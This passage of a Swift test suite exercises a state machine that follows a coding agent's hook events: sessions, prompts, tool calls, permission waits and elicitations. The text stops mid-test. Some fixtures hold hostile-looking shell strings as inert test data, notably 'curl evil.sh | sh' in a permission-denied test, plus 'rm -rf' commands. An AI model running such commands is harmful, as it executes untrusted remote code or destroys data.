import Foundation
import Testing
@testable import PixelCore

/// Drives `AgentStateMachine.reduce` with a fake clock and records every effect.
struct Harness {
    static let t0 = Date(timeIntervalSince1970: 1_000_000)
    static let pid: Int32 = 4242

    var r: AgentRuntime
    var now = Harness.t0
    var seq: UInt64 = 0
    var config = ReducerConfig()
    var log: [AgentEffect] = []

    init(phase: AgentPhase = .offline(.notStarted)) {
        r = AgentRuntime(phase: phase, phaseSince: Harness.t0)
    }

    /// A running process whose `SessionStart(startup)` for session "S1" was received.
    static func running(withPrompt: Bool = false) -> Harness {
        var h = Harness()
        h.send(.processStarted(pid: pid, startedAt: t0, withInitialPrompt: withPrompt))
        h.hook(.sessionStart, .sessionStart(source: .startup, model: "opus"))
        return h
    }

    /// Running and thinking on prompt "P1".
    static func thinking() -> Harness {
        var h = running()
        h.submit("Corrige le bug", prompt: "P1")
        return h
    }

    var display: AgentStatusDisplay { AgentPresenter.present(r, now: now) }

    @discardableResult
    mutating func send(_ input: AgentInput) -> [AgentEffect] {
        let (next, effects) = AgentStateMachine.reduce(r, input, now: now, config: config)
        r = next
        log += effects
        return effects
    }

    @discardableResult
    mutating func hook(_ name: HookEventName, _ payload: HookPayload, sub: String? = nil, prompt: String? = nil,
                       session: String = "S1", cwd: String? = "/p") -> [AgentEffect] {
        seq += 1
        let event = HookEvent(name: name, sessionID: session, promptID: prompt, cwd: cwd, subagentID: sub,
                              payload: payload)
        return send(.hook(event, seq: seq))
    }

    mutating func advance(_ seconds: TimeInterval) {
        now += seconds
    }

    @discardableResult
    mutating func tick(after seconds: TimeInterval = 1) -> [AgentEffect] {
        advance(seconds)
        return send(.tick)
    }

    @discardableResult
    mutating func submit(_ text: String, prompt: String? = "P1") -> [AgentEffect] {
        hook(.userPromptSubmit, .userPromptSubmit(promptHead: text, promptLength: text.count), prompt: prompt)
    }

    @discardableResult
    mutating func pre(_ tool: String, _ id: String?, _ summary: String = "", sub: String? = nil,
                      prompt: String? = nil) -> [AgentEffect] {
        hook(.preToolUse, .preToolUse(tool: tool, toolUseID: id, summary: summary), sub: sub, prompt: prompt)
    }

    @discardableResult
    mutating func post(_ tool: String, _ id: String?, failed: Bool = false, sub: String? = nil,
                       prompt: String? = nil) -> [AgentEffect] {
        hook(failed ? .postToolUseFailure : .postToolUse, .postToolUse(tool: tool, toolUseID: id, failed: failed),
             sub: sub, prompt: prompt)
    }

    @discardableResult
    mutating func permission(_ tool: String, _ id: String?, _ summary: String, sub: String? = nil,
                             prompt: String? = nil) -> [AgentEffect] {
        hook(.permissionRequest, .permissionRequest(tool: tool, toolUseID: id, summary: summary), sub: sub, prompt: prompt)
    }

    @discardableResult
    mutating func batch(sub: String? = nil) -> [AgentEffect] {
        hook(.postToolBatch, .postToolBatch, sub: sub)
    }

    @discardableResult
    mutating func stop(prompt: String? = "P1", active: Bool = false, bg: Int = 0, crons: Int = 0) -> [AgentEffect] {
        hook(.stop, .stop(lastMessageHead: "Fini.", stopHookActive: active, backgroundTasks: bg, sessionCrons: crons),
             prompt: prompt)
    }

    @discardableResult
    mutating func notification(_ type: String?, sub: String? = nil) -> [AgentEffect] {
        hook(.notification, .notification(type: type, message: "Claude needs your attention"), sub: sub)
    }

    @discardableResult
    mutating func stopFailure(_ type: String?) -> [AgentEffect] {
        hook(.stopFailure, .stopFailure(errorType: type, message: "API Error"))
    }

    /// Stop, then ticks until the quiet window commits it. Returns the commit's effects.
    @discardableResult
    mutating func stopAndCommit(prompt: String? = "P1", bg: Int = 0, crons: Int = 0) -> [AgentEffect] {
        stop(prompt: prompt, bg: bg, crons: crons)
        return tick(after: config.stopQuietWindow)
    }
}

/// Deterministic generator for shuffled delivery orders.
struct SplitMix64: RandomNumberGenerator {
    var state: UInt64
    init(seed: UInt64) { state = seed }
    mutating func next() -> UInt64 {
        state &+= 0x9E37_79B9_7F4A_7C15
        var z = state
        z = (z ^ (z >> 30)) &* 0xBF58_476D_1CE4_E5B9
        z = (z ^ (z >> 27)) &* 0x94D0_49BB_1331_11EB
        return z ^ (z >> 31)
    }
}

private func newWaitEffects(_ reason: WaitReason) -> [AgentEffect] {
    [.notify(.waiting(reason)), .playSound(.alert), .announce("attend ta réponse")]
}

extension AgentRuntime {
    /// `inFlightTools` reduced to their kinds, for short expectations.
    var inFlightKinds: [String: ToolKind] { inFlightTools.mapValues(\.kind) }
}

extension AgentEffect {
    var isNotify: Bool {
        if case .notify = self { return true }
        return false
    }

    var isPump: Bool {
        if case .pumpQueue = self { return true }
        return false
    }

    var cardSignal: AgentCardSignal? {
        if case .card(let signal) = self { return signal }
        return nil
    }
}

@Suite struct AgentStateMachineTests {
    // MARK: - T1–T3: process and session start

    @Test func t01_processStartedLaunchesAndRecordsTheProcess() {
        var h = Harness()
        h.r.pendingWaits[.terminal] = PendingWait(reason: .terminal, subagentID: nil, since: Harness.t0)
        h.r.inFlightTools["t1"] = InFlightTool(tool: "Bash", subagentID: nil, summary: "ls")
        h.r.pendingStop = PendingStop(at: Harness.t0, promptID: "P0", stopHookActive: false, backgroundTasks: 0, sessionCrons: 0)
        h.r.interruptRequestedAt = Harness.t0
        h.r.escapedDialogAt = Harness.t0
        h.r.closeRequestedAt = Harness.t0
        h.r.committedStopPromptID = "P0"
        h.r.currentPromptID = "P0"
        h.r.activeSubagentIDs = ["sub-1", "sub-2"]
        h.advance(5)
        let fx = h.send(.processStarted(pid: 77, startedAt: Harness.t0 + 4, withInitialPrompt: true))
        #expect(fx == [.recordProcess(ProcessStamp(pid: 77, startedAt: Harness.t0 + 4))])
        #expect(h.r.phase == .launching)
        #expect(h.r.phaseSince == h.now)
        #expect(h.r.pid == 77)
        #expect(h.r.launchedWithPrompt)
        #expect(h.r.hookHealth == .unknown(since: h.now))
        #expect(h.r.pendingWaits.isEmpty && h.r.inFlightTools.isEmpty)
        #expect(h.r.pendingStop == nil && h.r.interruptRequestedAt == nil && h.r.closeRequestedAt == nil)
        #expect(h.r.escapedDialogAt == nil)
        #expect(h.r.committedStopPromptID == nil && h.r.currentPromptID == nil)
        #expect(h.r.activeSubagents == 0)
    }

    @Test func t02_sessionStartMovesToIdleAndRecordsTheSession() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.advance(2)
        h.seq = 41
        let fx = h.hook(.sessionStart, .sessionStart(source: .startup, model: "opus"))
        #expect(fx == [.recordSession(SessionRef(sessionID: "S1", cwd: "/p", startedAt: h.now, source: .startup,
                                                 transcriptPath: nil, model: "opus"))])
        #expect(h.r.phase == .idle)
        #expect(h.r.currentSessionID == "S1")
        #expect(h.r.hookHealth == .healthy)
        #expect(h.r.lastHookAt == h.now)
        #expect(h.r.hookSeq == 42)
    }

    @Test func t02_sessionStartWithInitialPromptShowsThinking() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: true))
        h.hook(.sessionStart, .sessionStart(source: .startup, model: nil), cwd: nil)
        #expect(h.r.phase == .thinking)
        #expect(h.r.launchedWithPrompt)
        h.submit("Premier post-it")
        #expect(h.r.phase == .thinking)
        #expect(!h.r.launchedWithPrompt)
    }

    @Test func t02_sessionStartRecordsTheCwdOrAnEmptyOne() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        let fx = h.hook(.sessionStart, .sessionStart(source: .resume, model: nil), cwd: nil)
        #expect(fx == [.recordSession(SessionRef(sessionID: "S1", cwd: "", startedAt: h.now, source: .resume))])
        #expect(h.r.phase == .idle)
    }

    @Test func t02_anyFirstMainHookLeavesLaunching() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        h.hook(.cwdChanged, .cwdChanged("/p/sub"))
        #expect(h.r.phase == .idle)

        var g = Harness()
        g.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: false))
        g.pre("Bash", "t1", "ls")
        #expect(g.r.phase == .working(.bash))
    }

    @Test func t03_compactKeepsThePhaseAndTheSession() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "npm test")
        let fx = h.hook(.sessionStart, .sessionStart(source: .compact, model: nil))
        #expect(fx.isEmpty)
        #expect(h.r.phase == .working(.bash))
        #expect(h.r.currentSessionID == "S1")
    }

    @Test func t03_clearEndsTheOldSessionAndGoesIdle() {
        var h = Harness.thinking()
        h.stopAndCommit()
        var fx = h.hook(.sessionEnd, .sessionEnd(reason: "clear"))
        #expect(fx == [.endSession(sessionID: "S1", reason: "clear", at: h.now)])
        #expect(h.r.currentSessionID == nil)
        fx = h.hook(.sessionStart, .sessionStart(source: .clear, model: nil), session: "S2")
        #expect(fx == [.recordSession(SessionRef(sessionID: "S2", cwd: "/p", startedAt: h.now, source: .clear))])
        #expect(h.r.phase == .idle)
        #expect(h.r.currentSessionID == "S2")
    }

    @Test func t03_sameSessionIsRecordedOnce() {
        var h = Harness.running()
        let fx = h.hook(.sessionStart, .sessionStart(source: .resume, model: nil))
        #expect(fx.isEmpty)
    }

    @Test func t03_missedSessionEndClosesThePreviousSession() {
        var h = Harness.running()
        let fx = h.hook(.sessionStart, .sessionStart(source: .resume, model: nil), session: "S2")
        #expect(fx == [.endSession(sessionID: "S1", reason: nil, at: h.now),
                       .recordSession(SessionRef(sessionID: "S2", cwd: "/p", startedAt: h.now, source: .resume))])
    }

    @Test func t03_lateSessionStartDoesNotHideARunningTurn() {
        var h = Harness()
        h.send(.processStarted(pid: Harness.pid, startedAt: Harness.t0, withInitialPrompt: true))
        h.submit("Premier post-it")
        h.pre("Read", "t1", "README.md")
        h.hook(.sessionStart, .sessionStart(source: .startup, model: nil))
        #expect(h.r.phase == .working(.read))
    }

    @Test func subagentSessionEventsAreIgnored() {
        var h = Harness.thinking()
        let before = h.r
        let fx = h.hook(.sessionStart, .sessionStart(source: .startup, model: nil), sub: "sub-1", session: "S9")
        #expect(fx.isEmpty)
        #expect(h.r.currentSessionID == before.currentSessionID)
        #expect(h.r.phase == .thinking)
    }

    // MARK: - T4: UserPromptSubmit

    @Test func t04_userPromptSubmitThinksAndLiftsEveryWait() {
        var h = Harness.running()
        h.r.pendingWaits[.tool(toolUseID: "old")] = PendingWait(reason: .permission(tool: "Bash", summary: "ls"),
                                                                subagentID: "sub-1", since: h.now)
        h.r.acknowledgedWaiting = true
        h.r.inFlightTools["stale"] = InFlightTool(tool: "Bash", subagentID: nil, summary: "ls")
        h.advance(1)
        let fx = h.submit("Refais les tests", prompt: "P7")
        #expect(fx.isEmpty)
        #expect(h.r.phase == .thinking)
        #expect(h.r.phaseSince == h.now)
        #expect(h.r.pendingWaits.isEmpty)
        #expect(!h.r.acknowledgedWaiting)
        #expect(h.r.inFlightTools.isEmpty)
        #expect(h.r.currentPromptID == "P7")
    }

    @Test func t04_userPromptSubmitConfirmsTheMatchingDelivery() {
        var h = Harness.running()
        let prefix = AgentStateMachine.normalizedPromptPrefix("Corrige  le bug\nde login, puis ajoute un test de non-régression")
        #expect(prefix == "Corrige le bug de login, puis ajoute un")
        let delivery = PendingDelivery(itemID: "card-1", prefix: prefix, startedAt: h.now, hookSeqAtStart: h.r.hookSeq)
        h.send(.deliveryStarted(delivery))
        #expect(h.r.pendingDelivery == delivery)
        let fx = h.submit("Corrige le bug de login, puis ajoute un test de non-régression", prompt: "P2")
        #expect(fx == [.card(.deliveryConfirmed(promptID: "P2"))])
        #expect(h.r.pendingDelivery == nil)
    }

    @Test func t04_anotherPromptKeepsThePendingDelivery() {
        var h = Harness.running()
        let delivery = PendingDelivery(itemID: "card-1", prefix: "Corrige le bug", startedAt: h.now, hookSeqAtStart: 1)
        h.send(.deliveryStarted(delivery))
        let fx = h.submit("Autre chose", prompt: "P2")
        #expect(fx.isEmpty)
        #expect(h.r.pendingDelivery == delivery)
    }

    @Test func promptMatchingIgnoresWhitespaceDifferences() {
        #expect(AgentStateMachine.prompt("  Tâche :\n!rm  -rf", matchesDeliveryPrefix: "Tâche : !rm -rf"))
        #expect(!AgentStateMachine.prompt("Tâche", matchesDeliveryPrefix: "Tâche : !rm -rf"))
        #expect(AgentStateMachine.normalizedPromptPrefix("   ") == "")
        #expect(AgentStateMachine.normalizedPromptPrefix(String(repeating: "a", count: 100)).count == 40)
    }

    // MARK: - T5–T8: tools and waits

    @Test func t05_askUserQuestionOpensAQuestionWait() {
        var h = Harness.thinking()
        let q = AskedQuestion(header: "Base", question: "Quelle base de données ?", options: ["SQLite", "Postgres"],
                              multiSelect: false)
        let fx = h.hook(.preToolUse, .askUserQuestion(toolUseID: "q1", questions: [q]))
        #expect(fx == newWaitEffects(.question([q])))
        #expect(h.r.phase == .thinking)
        #expect(h.r.pendingWaits[.tool(toolUseID: "q1")]?.reason == .question([q]))
        #expect(h.r.kind == .waitingInput)
        h.post("AskUserQuestion", "q1")
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .thinking)
    }

    @Test func t05_undecodedQuestionAndMissingIDStillWait() {
        var h = Harness.thinking()
        h.seq = 9
        h.pre("AskUserQuestion", nil)
        #expect(h.r.pendingWaits[.tool(toolUseID: "seq-10")]?.reason == .question([]))
        #expect(h.r.phase == .thinking)
        #expect(h.r.inFlightTools.isEmpty)
    }

    @Test func t06_mainPreToolUseWorksWithThatTool() {
        var h = Harness.thinking()
        h.advance(1)
        let fx = h.pre("Bash", "t1", "npm test")
        #expect(fx.isEmpty)
        #expect(h.r.phase == .working(.bash))
        #expect(h.r.phaseSince == h.now)
        #expect(h.r.inFlightKinds == ["t1": .bash])
        h.pre("mcp__github__create_issue", "t2")
        #expect(h.r.phase == .working(.mcp("github")))
    }

    @Test func toolKindsOfMCPToolsNameTheWholeServer() {
        #expect(ToolKind.from(toolName: "mcp__github__create_issue") == .mcp("github"))
        #expect(ToolKind.from(toolName: "mcp__claude_ai_Gmail__search_threads") == .mcp("claude_ai_Gmail"))
        #expect(ToolKind.from(toolName: "mcp__my_a__x") != ToolKind.from(toolName: "mcp__my_b__y"))
        #expect(ToolKind.from(toolName: "mcp__server") == .mcp("server"))
        #expect(ToolKind.from(toolName: "mcp__") == .mcp("mcp__"))
        #expect(ToolKind.from(toolName: "Write") == .edit)
        #expect(ToolKind.from(toolName: "ExitPlanMode") == .other("ExitPlanMode"))
    }

    @Test func t07_subagentToolsKeepTheMainPhase() {
        var h = Harness.thinking()
        h.pre("Agent", "a1", "Explore le code")
        h.pre("Bash", "s1", "grep -r TODO", sub: "sub-1")
        #expect(h.r.phase == .working(.subagent))
        #expect(h.r.inFlightKinds == ["a1": .subagent, "s1": .bash])
        h.post("Bash", "s1", sub: "sub-1")
        #expect(h.r.phase == .working(.subagent))
        #expect(h.r.inFlightKinds == ["a1": .subagent])
    }

    /// A main batch, Stop or prompt ends main calls only: a background subagent's call still runs, and its
    /// id-less `PermissionRequest` must pair with it, not with a main call of the same tool.
    @Test func t07_mainTurnBoundariesKeepSubagentCalls() {
        var h = Harness.thinking()
        h.hook(.subagentStart, .subagent(started: true, type: "general-purpose"), sub: "sub-A")
        h.pre("Bash", "sub-t", "npm audit", sub: "sub-A")
        h.pre("Read", "r1", "a.txt")
        h.batch()
        #expect(h.r.inFlightKinds == ["sub-t": .bash])
        #expect(h.r.phase == .thinking)
        h.pre("Bash", "main-t", "ls")
        h.permission("Bash", nil, "npm audit", sub: "sub-A")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "sub-t")])
        #expect(h.r.pendingWaits[.tool(toolUseID: "sub-t")]?.subagentID == "sub-A")
        h.post("Bash", "main-t")
        #expect(h.r.kind == .waitingInput)
        #expect(h.r.phase == .thinking)
        h.stop()
        h.submit("Suite", prompt: "P2")
        #expect(h.r.inFlightKinds == ["sub-t": .bash])
        // The subagent stops: its calls are over.
        h.pre("Bash", "sub-u", "npm ci", sub: "sub-A")
        h.hook(.subagentStop, .subagent(started: false, type: "general-purpose"), sub: "sub-A")
        #expect(h.r.inFlightTools.isEmpty)
    }

    @Test func t08_permissionRequestWaitsForMainAndSubagents() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "rm -rf dist")
        var fx = h.permission("Bash", "t1", "rm -rf dist")
        #expect(fx == newWaitEffects(.permission(tool: "Bash", summary: "rm -rf dist")))
        #expect(h.r.phase == .working(.bash))
        h.advance(1)
        fx = h.permission("Edit", "s1", "a.swift", sub: "sub-1")
        #expect(fx.count == 3)
        #expect(h.r.pendingWaits[.tool(toolUseID: "s1")] == PendingWait(reason: .permission(tool: "Edit", summary: "a.swift"),
                                                                         subagentID: "sub-1", since: h.now))
        #expect(h.r.state == .waitingInput(.permission(tool: "Bash", summary: "rm -rf dist"), count: 2,
                                           since: Harness.t0))
    }

    @Test func t08_reopeningAnOpenWaitEmitsNothing() {
        var h = Harness.thinking()
        h.permission("Bash", "t1", "ls")
        h.send(.userKeystroke(.printable))
        #expect(h.r.acknowledgedWaiting)
        let fx = h.permission("Bash", "t1", "ls")
        #expect(fx.isEmpty)
        #expect(h.r.acknowledgedWaiting)
    }

    @Test func t08_permissionWithoutToolUseIDUsesTheSequenceNumber() {
        var h = Harness.thinking()
        h.seq = 99
        h.permission("WebFetch", nil, "https://example.com")
        #expect(h.r.pendingWaits[.tool(toolUseID: "seq-100")] != nil)
    }

    /// The documented `PermissionRequest` input has no `tool_use_id`.
    @Test func t08_permissionWithoutToolUseIDPairsWithTheOnlyCallOfThatKindInFlight() {
        var h = Harness.thinking()
        h.pre("Read", "r1", "a.txt")
        h.pre("Bash", "t1", "rm -rf dist")
        h.permission("Bash", nil, "rm -rf dist")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "t1")])
        h.post("Read", "r1")
        #expect(h.r.pendingWaits.count == 1)
        #expect(h.r.phase == .working(.bash))
        h.post("Bash", "t1")
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .thinking)
    }

    @Test func t08_repeatedPermissionWithoutToolUseIDEmitsNothing() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        h.permission("Bash", nil, "ls")
        #expect(h.permission("Bash", nil, "ls").isEmpty)
        #expect(h.permission("Bash", nil, "ls", sub: "sub-1").count == 3)
        #expect(h.r.pendingWaits.count == 2)
    }

    @Test func t08_permissionWithoutToolUseIDPairsOnlyWithItsOwnAgentsCalls() {
        var h = Harness.thinking()
        h.pre("Bash", "s1", "make", sub: "sub-1")
        h.pre("Bash", "s2", "make", sub: "sub-2")
        h.pre("Bash", "m1", "make")
        h.permission("Bash", nil, "make", sub: "sub-2")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "s2")])
        h.post("Bash", "s1", sub: "sub-1")
        h.post("Bash", "m1")
        h.post("Edit", "e1", sub: "sub-2")
        #expect(h.r.pendingWaits.count == 1)
        h.post("Bash", "s2", sub: "sub-2")
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.inFlightTools.isEmpty)
    }

    /// Parallel read-only calls of one tool: the allowed call finishing first must not lift the other's dialog.
    @Test func t08_parallelCallsOfOneToolPairByTheirInput() {
        var h = Harness.thinking()
        h.pre("Read", "A", "/etc/hosts")
        h.pre("Read", "B", "/p/src/x")
        h.permission("Read", nil, "/etc/hosts")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "A")])
        h.post("Read", "B")
        #expect(h.r.kind == .waitingInput)
        #expect(h.r.phase == .working(.read))
        // The ~6 s catch-up of the same dialog changes nothing.
        #expect(h.notification("permission_prompt").isEmpty)
        h.post("Read", "A")
        #expect(h.r.state == .phase(.thinking))

        var web = Harness.thinking()
        web.pre("WebFetch", "w1", "https://docs.example.com/a")
        web.pre("WebFetch", "w2", "https://inconnu.example.org/b")
        web.permission("WebFetch", nil, "https://inconnu.example.org/b")
        web.post("WebFetch", "w1")
        #expect(web.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "w2")])
    }

    /// When the input does not tell the calls apart (another hook rewrote it), the wait stays open until every
    /// call it may belong to has reported.
    @Test func t08_ambiguousPermissionWaitsForItsLastCandidate() {
        var h = Harness.thinking()
        h.pre("Read", "A", "a.txt")
        h.pre("Read", "B", "b.txt")
        h.seq = 10
        h.permission("Read", nil, "réécrit.txt")
        #expect(h.r.pendingWaits[.tool(toolUseID: "seq-11")]?.candidateToolUseIDs == ["A", "B"])
        h.post("Read", "B")
        #expect(h.r.pendingWaits[.tool(toolUseID: "seq-11")]?.candidateToolUseIDs == ["A"])
        // A call started after the request cannot be the one waiting.
        h.pre("Read", "C", "c.txt")
        h.post("Read", "C")
        #expect(h.r.pendingWaits.count == 1)
        h.post("Read", "A", failed: true)
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .thinking)

        var g = Harness.thinking()
        g.pre("Read", "A", "a.txt")
        g.pre("Read", "B", "b.txt")
        g.permission("Read", nil, "réécrit.txt")
        g.hook(.permissionDenied, .permissionDenied(tool: "Read", toolUseID: "A"))
        #expect(g.r.pendingWaits.count == 1)
        g.batch()
        #expect(g.r.state == .phase(.thinking))
    }

    @Test func t08_knownCallsDoNotResolveAWaitWithoutCandidates() {
        var h = Harness.thinking()
        h.permission("Bash", nil, "a")
        h.pre("Bash", "t9", "b")
        h.post("Bash", "t9")
        #expect(h.r.pendingWaits.count == 1)
        // A result whose call was never seen (its PreToolUse was missed) does.
        h.post("Bash", "t8")
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t08_unpairedWaitsAreResolvedOldestFirstAndByDenials() {
        var h = Harness.thinking()
        h.permission("Bash", nil, "a")
        h.advance(1)
        h.permission("Bash", nil, "b")
        #expect(h.r.pendingWaits.count == 2)
        h.hook(.permissionDenied, .permissionDenied(tool: "Bash", toolUseID: "x1"))
        #expect(h.r.state == .waitingInput(.permission(tool: "Bash", summary: "b"), count: 1, since: h.now))
        h.hook(.permissionDenied, .permissionDenied(tool: nil, toolUseID: "x2"))
        #expect(h.r.pendingWaits.count == 1)
        h.post("Bash", nil)
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t05_permissionRequestOfAnOpenQuestionAddsNoWait() {
        var h = Harness.thinking()
        h.hook(.preToolUse, .askUserQuestion(toolUseID: "q1", questions: []))
        #expect(h.permission("AskUserQuestion", nil, "Quelle base ?").isEmpty)
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "q1")])
        // A subagent's question is a wait of its own.
        #expect(h.permission("AskUserQuestion", nil, "Quelle base ?", sub: "sub-1").count == 3)
        h.post("AskUserQuestion", "q1")
        #expect(h.r.pendingWaits.count == 1)
    }

    // MARK: - T9–T12b

    @Test func t09_notificationCatchUpOpensAWaitWhenNoneIsOpen() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        let fx = h.notification("permission_prompt")
        #expect(fx == newWaitEffects(.notification(type: "permission_prompt")))
        #expect(h.r.pendingWaits[.notification("permission_prompt")] != nil)
        #expect(h.notification("agent_needs_input").isEmpty)
        #expect(h.r.pendingWaits.count == 1)
    }

    @Test func t09_catchUpIsSkippedWhenAWaitIsOpen() {
        var h = Harness.thinking()
        h.permission("Bash", "t1", "ls")
        #expect(h.notification("permission_prompt").isEmpty)
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "t1")])
    }

    @Test func t09_otherNotificationTypesDoNotWait() {
        var h = Harness.thinking()
        #expect(h.notification("auth_success").isEmpty)
        #expect(h.notification(nil).isEmpty)
        #expect(h.notification("agent_completed").isEmpty)
        #expect(h.r.pendingWaits.isEmpty)
        for type in ["elicitation_dialog", "elicitation_url_dialog"] {
            var g = Harness.thinking()
            g.notification(type)
            #expect(g.r.pendingWaits[.notification(type)] != nil)
        }
    }

    @Test func t09_catchUpWaitIsLiftedByAnyMainEventButNotifications() {
        var h = Harness.thinking()
        h.notification("permission_prompt")
        h.notification("auth_success")
        h.pre("Bash", "s1", sub: "sub-1")
        #expect(h.r.pendingWaits.count == 1)
        h.post("Bash", "t0")
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t10_idlePromptWhileWorkingMeansAMissedStop() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "sleep 100")
        let fx = h.notification("idle_prompt")
        #expect(fx == [.reconcile])
        #expect(h.r.phase == .idle)
        #expect(h.r.inFlightTools.isEmpty)

        var g = Harness.thinking()
        g.stopAndCommit()
        #expect(g.notification("idle_prompt").isEmpty)
        #expect(g.r.phase == .done)
    }

    /// Esc on a permission dialog aborts the turn: no PostToolUse, PermissionDenied, Stop, nor (very probably)
    /// PostToolBatch. The idle prompt a minute later proves no main dialog is open.
    @Test func t10_idlePromptLiftsTheMainWaitsOfAnAbortedTurn() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "rm -rf dist")
        h.permission("Bash", nil, "rm -rf dist")
        h.hook(.elicitation, .elicitation(server: "gh", id: nil, message: "?"))
        h.permission("Edit", "s1", "x", sub: "sub-1")
        h.advance(60)
        #expect(h.notification("idle_prompt") == [.reconcile])
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "s1")])
        #expect(h.r.phase == .idle)

        var g = Harness.thinking()
        g.pre("Bash", "t1", "rm -rf dist")
        g.permission("Bash", nil, "rm -rf dist")
        g.advance(60)
        g.notification("idle_prompt")
        g.advance(5)
        g.send(.screen(ScreenFacts(inputBox: .empty, recognized: true)))
        let delivery = PendingDelivery(itemID: "card-1", prefix: "x", startedAt: g.now, hookSeqAtStart: g.r.hookSeq)
        g.send(.deliveryStarted(delivery))
        #expect(g.r.pendingDelivery == delivery)
    }

    @Test func t10_idlePromptKeepsAUsageLimitPressEnter() {
        var h = Harness.thinking()
        h.stopFailure("rate_limit")
        h.notification("quota_auto_resume_stale")
        h.notification("idle_prompt")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.notification("quota_auto_resume_stale")])
    }

    @Test func t11_elicitationOpensAWaitResolvedByItsResult() {
        var h = Harness.thinking()
        h.pre("mcp__github__create_issue", "t1")
        let fx = h.hook(.elicitation, .elicitation(server: "github", id: "e1", message: "Choisis un dépôt"))
        #expect(fx == newWaitEffects(.elicitation(server: "github", message: "Choisis un dépôt")))
        #expect(h.r.kind == .waitingInput)
        h.hook(.elicitationResult, .elicitationResult(server: "github", id: "e1"))
        #expect(h.r.pendingWaits.isEmpty)
        // The MCP tool is still running.
        #expect(h.r.phase == .working(.mcp("github")))
    }

    @Test func t11_elicitationResultWithoutIDResolvesThatAgentsElicitations() {
        var h = Harness.thinking()
        h.hook(.elicitation, .elicitation(server: nil, id: nil, message: "?"))
        h.hook(.elicitation, .elicitation(server: nil, id: "e2", message: "?"), sub: "sub-1")
        #expect(h.r.pendingWaits.count == 2)
        h.hook(.elicitationResult, .elicitationResult(server: nil, id: nil))
        #expect(h.r.pendingWaits.keys.map { $0 } == [.elicitation("e2")])
    }

    /// hooks.md: the form-mode `Elicitation` example has no `elicitation_id`, its `ElicitationResult` has one.
    @Test func t11_resultWithAnIDItsElicitationLackedResolvesIt() {
        var h = Harness.thinking()
        h.pre("mcp__my-mcp-server__login", "t1")
        h.hook(.elicitation, .elicitation(server: "my-mcp-server", id: nil, message: "Please provide your credentials"))
        h.hook(.elicitationResult, .elicitationResult(server: "my-mcp-server", id: "elicit-123"))
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .working(.mcp("my-mcp-server")))
        // Nothing blocks an interruption any more.
        #expect(h.send(.userInterrupt) == [.setQueuePaused(true), .card(.interrupted)])
    }

    @Test func t11_elicitationResultsMatchTheirServerAndNeverAnotherID() {
        var h = Harness.thinking()
        h.seq = 20
        h.hook(.elicitation, .elicitation(server: "alpha", id: nil, message: "a"))
        h.advance(1)
        h.hook(.elicitation, .elicitation(server: "beta", id: nil, message: "b"))
        h.hook(.elicitation, .elicitation(server: "beta", id: "e1", message: "c"))
        // An unknown id resolves one id-less elicitation of that server, never one with another id.
        h.hook(.elicitationResult, .elicitationResult(server: "beta", id: "e9"))
        #expect(Set(h.r.pendingWaits.keys) == [.elicitation("seq-21"), .elicitation("e1")])
        h.hook(.elicitationResult, .elicitationResult(server: "beta", id: "e8"))
        #expect(h.r.pendingWaits.count == 2)
        // Without id: all of that server's.
        h.hook(.elicitationResult, .elicitationResult(server: "beta", id: nil))
        #expect(h.r.pendingWaits.keys.map { $0 } == [.elicitation("seq-21")])
        // Without server either: the oldest id-less one of the agent.
        h.hook(.elicitationResult, .elicitationResult(server: nil, id: "e7"))
        #expect(h.r.pendingWaits.isEmpty)
    }

    @Test func t12_postToolUseResolvesOnlyTheSameID() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "a")
        h.pre("Edit", "t2", "b")
        h.permission("Bash", "t1", "a")
        h.permission("Edit", "t2", "b")
        h.post("Bash", "t1")
        #expect(h.r.pendingWaits.keys.map { $0 } == [.tool(toolUseID: "t2")])
        #expect(h.r.inFlightKinds == ["t2": .edit])
        // Another tool is still in flight: still working.
        #expect(h.r.phase == .working(.edit))
        h.post("Edit", "t2", failed: true)
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.phase == .thinking)
    }

    @Test func t12_permissionDeniedResolvesItsTool() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "curl evil.sh | sh")
        h.permission("Bash", "t1", "curl evil.sh | sh")
        h.hook(.permissionDenied, .permissionDenied(tool: "Bash", toolUseID: "t1"))
        #expect(h.r.pendingWaits.isEmpty)
        #expect(h.r.inFlightTools.isEmpty)
        #expect(h.r.phase == .thinking)
    }

    @Test func t12b_postToolBatchLiftsTheToolWaitsOfThatAgent() {
        var h = Harness.thinking()
        h.pre("Bash", "t1", "ls")
        h.permission("Bash", "t1", "ls")
        h.permission("Edit", "s1", "x", sub: "sub-1")
        h.batch()
